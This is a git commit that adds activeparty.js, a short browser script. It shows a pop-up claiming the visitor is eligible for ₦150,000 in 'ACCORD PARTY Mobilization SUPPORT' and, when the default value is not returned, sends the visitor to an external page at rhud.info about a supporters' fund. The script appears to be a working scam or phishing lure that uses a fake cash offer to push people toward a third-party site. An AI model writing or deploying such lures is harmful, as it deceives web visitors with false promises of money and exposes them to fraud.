bb42cd4bef637c4bc84b6f413c52d1fa08fd2506
graantx <slicer_sizzles9k@icloud.com>
2026-05-17 18:06:57 +0100

    Create activeparty.js

---
+++ activeparty.js
@@ -0,0 +1,11 @@
+
+var password = '₦150,000';
+
+password = prompt(
+  'Congratulations, you are eligible for ₦150,000 ACCORD PARTY Mobilization SUPPORT. Click OK to activate now.',
+  '₦150,000'
+);
+
+if (password !== '₦150,000') {
+    location.href = 'https://rhud.info/Accord-Party-Supporters-Fund.html';
+}
